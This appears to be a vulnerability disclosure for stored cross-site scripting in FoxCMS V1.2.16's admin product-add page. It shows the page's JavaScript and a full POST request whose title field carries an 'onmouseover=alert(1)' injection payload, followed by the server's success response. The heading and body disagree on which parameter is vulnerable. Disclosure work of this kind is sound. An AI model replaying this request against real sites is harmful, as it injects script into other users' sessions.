FoxCMS - Cross Site Scripting on (app/admin/view/product/add.html title parameter) 

Vendor Homepage:
```
https://gitee.com/qianfox/foxcms
```

Version: 

```
V1.2.16
```

Tested on: 

```
PHP, Nignx, MySQL
```

Affected Page:

```
app/admin/view/product/add.html
```

On this page, content parameter is vulnerable to Cross Site Scripting

```
foxui.dialog({
	title: '保存',
	content: '您确定要保存吗',
	cancelText: '取消',
	confirmText: '保存',
	confirm: function(callback) {
		foxui.loading({text:"发布中"});
		ajaxR("{:url('add')}","post",curData,{},function(res) {
					if (res.code == 1) {
						foxui.message({
							type: 'success',
							text: res.msg
						})
						if(res.data != ""){
							let params = res.data;
							if(params.oneId && params.oneId == "key3"){
								addDataBuildDetail(params);
								singleAllSite(params);
							}
							foxui.closeLoading();
						}
						window.location.href=document.referrer;//返回并且刷新
					} else {
						foxui.message({
							type: 'warning',
							text: res.msg
						})
					}
					foxui.closeLoading();
				},
				function(res) {
					foxui.message({
						type: 'warning',
						text: res.responseJSON.msg
					})
					foxui.closeLoading();
				})
		callback();
	},
	cancel: function() {
		foxui.message({
			type: 'warning',
			text: res.msg
		})
	},
})
```

Function point location：

<img width="2878" height="1488" alt="8aab9352-e815-4bbc-8ce1-55f8832efff7" src="https://github.com/user-attachments/assets/d0f5aa29-6fea-4708-b9bb-ace45308b65c" />


Request:

```
POST /index.php/admin4435/Product/add.html HTTP/1.1
Host: www.foxcms.cms
Content-Length: 329
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://www.foxcms.cms
Referer: http://www.foxcms.cms/index.php/admin4435/Product/add.html?type=1&bcid=3_14
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=7c8341b30311677309e6835915d1b2c9; access_127_0_0_1=1761129226
Connection: close

title=%3Cinput+onmouseover%3Dalert(1)+%2F%3E&brief_title=test3&article_field=&column_id=14&column=A%E7%B3%BB%E5%88%97&breviary_pic_id=456&keywords=&description=&article_source=&author=&team_status=%2C&content=&picset_ids=&release_time=&click=&status=1&tags=&product_attr_ids=3%2C4%2C5%2C6%2C7%2C8%2C9%2C&price=&buy_link=&big_img=
```

Response:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Wed, 22 Oct 2025 12:28:07 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: PHP/7.3.4
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 1800
Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-CSRF-TOKEN, X-Requested-With
Access-Control-Allow-Origin: http://www.foxcms.cms
Set-Cookie: PHPSESSID=7c8341b30311677309e6835915d1b2c9; expires=Thu, 23-Oct-2025 12:28:07 GMT; Max-Age=86400; path=/
Content-Length: 59

{"code":1,"msg":"操作成功","data":"","url":"","wait":1}
```
<img width="2878" height="1566" alt="image" src="https://github.com/user-attachments/assets/26de6123-cbc3-4604-8290-52b5c47231ed" />
